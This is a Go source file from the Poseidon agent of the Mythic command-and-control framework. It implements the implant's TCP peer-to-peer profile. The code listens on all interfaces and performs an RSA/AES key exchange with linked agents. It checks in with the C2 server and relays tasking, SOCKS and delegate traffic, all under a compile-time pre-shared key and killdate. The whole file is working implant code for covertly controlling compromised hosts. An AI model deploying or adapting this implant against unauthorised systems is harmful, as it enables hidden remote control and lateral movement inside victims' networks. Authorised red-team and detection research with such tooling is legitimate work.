// +build linux darwin
// +build poseidon_tcp

package profiles

import (
	"crypto/rsa"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"time"

	"github.com/google/uuid"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// All variables must be a string so they can be set with ldflags

// port to listen on
var port string

// killdate is the Killdate
var killdate string

// encrypted_exchange_check is Perform Key Exchange
var encrypted_exchange_check string

// AESPSK is the Crypto type
var AESPSK string

type C2Default struct {
	ExchangingKeys       bool
	Key                  string
	RsaPrivateKey        *rsa.PrivateKey
	Port                 string
	EgressTCPConnections map[string]net.Conn
	FinishedStaging      bool
}

func New() structs.Profile {
	profile := C2Default{
		Key:                  AESPSK,
		Port:                 port,
		ExchangingKeys:       encrypted_exchange_check == "T",
		EgressTCPConnections: make(map[string]net.Conn),
		FinishedStaging:      false,
	}
	return &profile
}
func (c *C2Default) Start() {
	// start listening
	listen, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%s", c.Port))
	if err != nil {
		fmt.Println("Failed to bind")
		return
	}
	defer listen.Close()
	//fmt.Printf("Started listening...\n")
	go c.CreateMessagesForEgressConnections()
	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println("Failed to accept connection")
			continue
		}
		go c.handleClientConnection(conn)
	}
}
func (c *C2Default) handleClientConnection(conn net.Conn) {
	// this is a new client connection to this listening server
	// first thing we want to do is save it off
	connectionUUID := uuid.New().String()
	c.EgressTCPConnections[connectionUUID] = conn
	go c.handleEgressConnectionIncomingMessage(conn)
	if c.FinishedStaging {
		//fmt.Printf("FinishedStaging, Got a new connection, sending checkin\n")
		go c.CheckIn()
	} else if c.ExchangingKeys {
		//fmt.Printf("ExchangingKeys, starting EKE\n")
		go c.NegotiateKey()
	} else {
		//fmt.Printf("Not finished staging, not exchaing keys, sending checkin\n")
		go c.CheckIn()
	}
}
func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
	// These are normally formatted messages for our agent
	// in normal base64 format with our uuid, parse them as such
	var sizeBuffer uint32
	//fmt.Printf("handleEgressConnectionIncomingMessage started\n")
	for {
		err := binary.Read(conn, binary.BigEndian, &sizeBuffer)
		if err != nil {
			fmt.Println("Failed to read size from tcp connection:", err)
			if err == io.EOF {
				// the connection is broken, we should remove this entry from our egress map
				c.RemoveEgressTCPConnectionByConnection(conn)
			}
			return
		}
		if sizeBuffer > 0 {
			readBuffer := make([]byte, sizeBuffer)

			readSoFar, err := conn.Read(readBuffer)
			if err != nil {
				fmt.Println("Failed to read bytes from tcp connection:", err)
				if err == io.EOF {
					// the connection is broken, we should remove this entry from our egress map
					c.RemoveEgressTCPConnectionByConnection(conn)
				}
				return
			}
			totalRead := uint32(readSoFar)
			for totalRead < sizeBuffer {
				// we didn't read the full size of the message yet, read more
				nextBuffer := make([]byte, sizeBuffer-totalRead)
				readSoFar, err = conn.Read(nextBuffer)
				if err != nil {
					fmt.Println("Failed to read bytes from tcp connection:", err)
					if err == io.EOF {
						// the connection is broken, we should remove this entry from our egress map
						c.RemoveEgressTCPConnectionByConnection(conn)
					}
					return
				}
				copy(readBuffer[totalRead:], nextBuffer)
				totalRead = totalRead + uint32(readSoFar)
			}
			//fmt.Printf("Read %d bytes from connection\n", totalRead)
			raw, err := base64.StdEncoding.DecodeString(string(readBuffer))
			if err != nil {
				//log.Println("Error decoding base64 data: ", err.Error())
				continue
			}

			if len(raw) < 36 {
				continue
			}

			enc_raw := raw[36:] // Remove the Payload UUID
			// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
			if len(c.Key) != 0 {
				//log.Println("just did a post, and decrypting the message back")
				enc_raw = c.decryptMessage(enc_raw)
				//log.Println(enc_raw)
				if len(enc_raw) == 0 {
					// failed somehow in decryption
					continue
				}
			}
			if c.FinishedStaging {
				taskResp := structs.MythicMessageResponse{}
				err = json.Unmarshal(enc_raw, &taskResp)
				if err != nil {
					fmt.Printf("Failed to unmarshal message into MythicResponse: %v\n", err)
				}
				//fmt.Printf("Raw message from mythic: %s\n", string(enc_raw))
				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
			} else {
				if c.ExchangingKeys {
					// this will be our response to the initial staging message
					if c.FinishNegotiateKey(enc_raw) {
						c.CheckIn()
					} else {
						// we ran into some sort of issue during the staging process, so start it again
						c.NegotiateKey()
					}
				} else {
					// should be the result of c.Checkin()
					checkinResp := structs.CheckInMessageResponse{}
					err = json.Unmarshal(enc_raw, &checkinResp)
					if checkinResp.Status == "success" {
						SetMythicID(checkinResp.ID)
						c.FinishedStaging = true
					} else {
						fmt.Printf("Failed to checkin, got a weird message: %s\n", string(enc_raw))
					}
				}
			}

		}
	}
}

func (c *C2Default) ProfileType() string {
	return "tcp"
}

// CheckIn - either a new agent or a new client connection, do the same for both
func (c *C2Default) CheckIn() interface{} {
	checkin := CreateCheckinMessage()

	raw, err := json.Marshal(checkin)
	if err != nil {
		fmt.Printf("Failed to marshal checkin message\n")
		return false
	}
	return c.SendMessage(raw)

}

func (c *C2Default) FinishNegotiateKey(resp []byte) bool {
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err := json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		//log.Printf("Error unmarshaling eke response: %s\n", err.Error())
		return false
	}
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}
	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false
	return true
}

//NegotiateKey - EKE key negotiation
func (c *C2Default) NegotiateKey() bool {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	return c.SendMessage(raw).(bool)
}

//htmlPostData HTTP POST function
func (c *C2Default) SendMessage(sendData []byte) interface{} {
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data")
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() == "" {
		//fmt.Printf("prepending payload uuid\n")
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	} else {
		//fmt.Printf("prepending %s\n", GetMythicID())
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	}
	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
	// Write the bytes out to the TCP connection, bytes.NewBuffer(sendData)
	// This needs to go out one of the EgressConnections, doesn't matter which
	for {
		// make a copy of the keys for the c.EgressTCPConnections to loop over
		// that way we can safely remove bad entries of the actual c.EgressTCPConnections in our loop without issue
		keys := make([]string, len(c.EgressTCPConnections))
		i := 0
		for k := range c.EgressTCPConnections {
			keys[i] = k
			i++
		}
		for _, connectionUUID := range keys {
			err := binary.Write(c.EgressTCPConnections[connectionUUID], binary.BigEndian, uint32(len(sendData)))
			if err != nil {
				fmt.Printf("Failed to send down pipe with error: %v\n", err)
				// need to make sure we track that this egress connection is dead and should be removed
				c.RemoveEgressTCPConnection(connectionUUID)
				time.Sleep(200 * time.Millisecond)
				continue
			}
			_, err = c.EgressTCPConnections[connectionUUID].Write(sendData)
			if err != nil {
				fmt.Printf("Failed to send with error: %v\n", err)
				// need to make sure we track that this egress connection is dead and should be removed
				c.RemoveEgressTCPConnection(connectionUUID)
				time.Sleep(200 * time.Millisecond)
				continue
			}
			//fmt.Printf("Sent %d bytes to connection\n", totalWritten)
			return true
		}
		// if we get here it means we have no more active egress connections, so we can't send it anywhere useful
		time.Sleep(200 * time.Millisecond)
	}
}
func (c *C2Default) HandleDelegateMessageForInternalConnections(delegates []structs.DelegateMessage) {
	// got a message that needs to go to one of the c.InternalConnections
	// parse the delegate message and then switch based on UUID
	for i := 0; i < len(delegates); i++ {
		if conn, ok := InternalTCPConnections[delegates[i].UUID]; ok {
			//fmt.Printf("Got message for %s: %v\n", delegates[i].UUID, delegates[i].Message)
			_, err := conn.Write([]byte(delegates[i].Message))
			if err != nil {
				fmt.Printf("Failed to write to delegate connection: %v\n", err)
				// need to remove the connection and send a message back to Mythic about it
			}
		}
	}
	return
}
func (c *C2Default) CreateMessagesForEgressConnections() {
	// got a message that needs to go to one of the c.ExternalConnection
	for {
		msg := CreateMythicMessage()

		if msg.Delegates != nil || msg.Socks != nil || msg.Responses != nil || msg.Edges != nil {
			//fmt.Printf("Checking to see if there's anything to send to Mythic:\n%v\n", msg)
			// we need to get this message ready to send
			raw, err := json.Marshal(msg)
			if err != nil {
				fmt.Printf("Failed to marshal message to Mythic: %v\n", err)
				continue
			}
			//fmt.Printf("Sending message outbound to http: %v\n", msg)
			c.SendMessage(raw)
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func (c *C2Default) RemoveEgressTCPConnection(connectionUUID string) bool {
	if conn, ok := c.EgressTCPConnections[connectionUUID]; ok {
		conn.Close()
		delete(c.EgressTCPConnections, connectionUUID)
		return true
	}
	return false
}

func (c *C2Default) RemoveEgressTCPConnectionByConnection(connection net.Conn) bool {
	for connectionUUID, conn := range c.EgressTCPConnections {
		if connection.RemoteAddr().String() == conn.RemoteAddr().String() {
			// found the match, remove it and break
			c.RemoveEgressTCPConnection(connectionUUID)
			return true
		}
	}
	return false
}

func (c *C2Default) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2Default) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}

func (c *C2Default) SetSleepInterval(interval int) string {
	return fmt.Sprintf("Sleep interval not used for TCP P2P Profile\n")
}

func (c *C2Default) SetSleepJitter(jitter int) string {
	return fmt.Sprintf("Sleep Jitter not used for TCP P2P Profile\n")
}

func (c *C2Default) GetSleepTime() int {
	return 0
}
